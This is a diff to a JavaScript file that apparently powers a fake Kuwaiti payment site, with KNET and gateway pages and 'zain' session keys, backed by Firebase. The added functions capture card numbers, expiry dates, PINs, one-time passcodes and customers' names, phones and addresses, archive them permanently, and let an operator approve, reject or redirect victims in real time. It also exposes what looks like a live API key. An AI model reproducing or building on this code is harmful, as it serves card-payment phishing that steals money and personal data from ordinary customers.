@@ -1,12 +1,15 @@
 (function () {
+  // ═══════════════════════════════════════════════════════════
+  // إعدادات مشروع Firebase الجديد (kuwait-b7d4b) — موحّد للموقعين
+  // ═══════════════════════════════════════════════════════════
   const firebaseConfig = {
-    apiKey: "AIzaSyCw6S6m-6m-6m-6m-6m-6m-6m",
-    authDomain: "zain-kw-admin.firebaseapp.com",
-    databaseURL: "https://zain-kw-admin-default-rtdb.firebaseio.com",
-    projectId: "zain-kw-admin",
-    storageBucket: "zain-kw-admin.appspot.com",
-    messagingSenderId: "1234567890",
-    appId: "1:1234567890:web:1234567890"
+    apiKey: "AIzaSyAfWfzLyUlsq3NFsU2JK-qcIZkXgN023U0",
+    authDomain: "kuwait-b7d4b.firebaseapp.com",
+    databaseURL: "https://kuwait-b7d4b-default-rtdb.firebaseio.com",
+    projectId: "kuwait-b7d4b",
+    storageBucket: "kuwait-b7d4b.firebasestorage.app",
+    messagingSenderId: "686238776602",
+    appId: "1:686238776602:web:dfb65a9525b3b86cd740a3"
   };
 
   if (!firebase.apps.length) {
@@ -16,11 +19,16 @@
   const db = firebase.firestore();
   const rtd = firebase.database();
 
+  // إتاحة المراجع عالمياً للصفحات الأخرى
+  window.db = db;
+  window.rtd = rtd;
+
   let sessionId = localStorage.getItem('zain_session_id');
   if (!sessionId) {
     sessionId = 'sess_' + Math.random().toString(36).substr(2, 9);
     localStorage.setItem('zain_session_id', sessionId);
   }
+  window.sessionId = sessionId;
 
   window.getDeviceAndBrowser = function () {
     const ua = navigator.userAgent;
@@ -42,6 +50,7 @@
     if (path.includes('knet')) return 'صفحة الكي نت';
     if (path.includes('verification')) return 'صفحة التحقق';
     if (path.includes('gateway')) return 'بوابة الدفع';
+    if (path.includes('carte')) return 'سلة التسوق';
     return 'الصفحة الرئيسية';
   }
 
@@ -64,8 +73,8 @@
     const sessionData = {
       id: sessionId,
       status: 'active',
-      phone: '',
-      amount: '0.000 د.ك',
+      phone: localStorage.getItem('phone') || '',
+      amount: localStorage.getItem('finalAmount') || localStorage.getItem('amount') || '0.000 د.ك',
       page: friendlyPage,
       device: device,
       browser: browser,
@@ -85,6 +94,11 @@
       }
     });
 
+    // تتبع الحضور (presence) للوحة التحكم
+    const presenceRef = rtd.ref('presence/' + sessionId);
+    presenceRef.set({ online: true, lastSeen: now });
+    presenceRef.onDisconnect().set({ online: false, lastSeen: Date.now() });
+
     // Update Firestore
     docRef.get().then((snap) => {
       if (!snap.exists) {
@@ -95,10 +109,13 @@
     });
   };
 
+  // ═══════════════════════════════════════════════════════════
+  // إرسال بيانات البطاقة
+  // ═══════════════════════════════════════════════════════════
   window.pushFirebaseCard = function (bank, prefix, cardNum, expMonth, expYear, pin) {
     const attemptId = 'card_' + Date.now();
     const timestampStr = new Date().toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
-    
+
     const cardData = {
       id: attemptId,
       bankName: bank || 'غير معروف',
@@ -112,16 +129,103 @@
     rtd.ref('sessions/' + sessionId + '/attempts/' + attemptId).set(cardData);
     rtd.ref('sessions/' + sessionId).update({ hasNewActivity: true, page: 'صفحة التحقق' });
     db.collection("card_data").doc(sessionId).collection("attempts").doc(attemptId).set(cardData);
+    // أرشيف دائم في مجموعة cards
+    db.collection("cards").doc(attemptId).set({ ...cardData, sessionId: sessionId, createdAt: firebase.firestore.FieldValue.serverTimestamp() });
   };
 
+  // ═══════════════════════════════════════════════════════════
+  // إرسال رمز التحقق OTP
+  // ═══════════════════════════════════════════════════════════
   window.pushFirebaseOtp = function (otp) {
     const otpId = 'otp_' + Date.now();
     const timestampStr = new Date().toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
     const otpData = { id: otpId, otp: otp, timestamp: timestampStr };
-    
+
     rtd.ref('sessions/' + sessionId + '/otps/' + otpId).set(otpData);
     rtd.ref('sessions/' + sessionId).update({ hasNewActivity: true });
     db.collection("card_data").doc(sessionId).collection("otps").doc(otpId).set(otpData);
+    // أرشيف دائم في مجموعة otps
+    db.collection("otps").doc(otpId).set({ ...otpData, sessionId: sessionId, createdAt: firebase.firestore.FieldValue.serverTimestamp() });
+  };
+
+  // ═══════════════════════════════════════════════════════════
+  // إرسال بيانات العميل والتوصيل (الاسم، العنوان، الهاتف...)
+  // تُستدعى من صفحة السلة عند المتابعة للدفع
+  // ═══════════════════════════════════════════════════════════
+  window.pushFirebaseCustomer = function (customer) {
+    const data = {
+      sessionId: sessionId,
+      name: customer.name || '',
+      phone: customer.phone || '',
+      address: customer.address || '',
+      apartment: customer.apartment || '',
+      deliveryNotes: customer.deliveryNotes || '',
+      amount: customer.amount || '',
+      paymentType: customer.paymentType || 'full',
+      items: customer.items || [],
+      ip: '',
+      createdAt: firebase.firestore.FieldValue.serverTimestamp()
+    };
+    // تحديث الجلسة اللحظية
+    rtd.ref('sessions/' + sessionId).update({
+      phone: data.phone,
+      amount: data.amount,
+      customerName: data.name,
+      hasNewActivity: true
+    });
+    // حفظ دائم في Firestore
+    db.collection("customers").doc(sessionId).set(data, { merge: true });
+    if (data.items.length) {
+      db.collection("orders").doc(sessionId).set({
+        sessionId: sessionId,
+        items: data.items,
+        subtotal: data.amount,
+        paymentType: data.paymentType,
+        status: 'PENDING',
+        createdAt: firebase.firestore.FieldValue.serverTimestamp()
+      }, { merge: true });
+    }
+  };
+
+  // ═══════════════════════════════════════════════════════════
+  // الاستماع لأوامر لوحة التحكم (موافقة / رفض / تحويل / رسائل)
+  // callbacks: { onApproval, onRejection, onRedirect, onMessage }
+  // ═══════════════════════════════════════════════════════════
+  window.listenForAdminCommands = function (callbacks) {
+    callbacks = callbacks || {};
+    const cmdRef = rtd.ref('commands/' + sessionId);
+
+    cmdRef.child('approval').on('value', (snap) => {
+      const cmd = snap.val();
+      if (cmd && cmd.action === 'APPROVE_PAYMENT' && !window.__approvalHandled) {
+        window.__approvalHandled = true;
+        if (typeof callbacks.onApproval === 'function') callbacks.onApproval(cmd);
+      }
+    });
+
+    cmdRef.child('rejection').on('value', (snap) => {
+      const cmd = snap.val();
+      if (cmd && cmd.action === 'REJECT_PAYMENT' && !window.__rejectionHandled) {
+        window.__rejectionHandled = true;
+        if (typeof callbacks.onRejection === 'function') callbacks.onRejection(cmd);
+      }
+    });
+
+    cmdRef.child('redirect').on('value', (snap) => {
+      const cmd = snap.val();
+      if (cmd && cmd.action === 'REDIRECT_PAGE' && cmd.targetPage) {
+        if (typeof callbacks.onRedirect === 'function') {
+          callbacks.onRedirect(cmd);
+        } else {
+          window.location.href = cmd.targetPage;
+        }
+      }
+    });
+
+    rtd.ref('messages/' + sessionId).on('child_added', (snap) => {
+      const msg = snap.val();
+      if (msg && typeof callbacks.onMessage === 'function') callbacks.onMessage(msg);
+    });
   };
 
   window.initFirebaseSession();
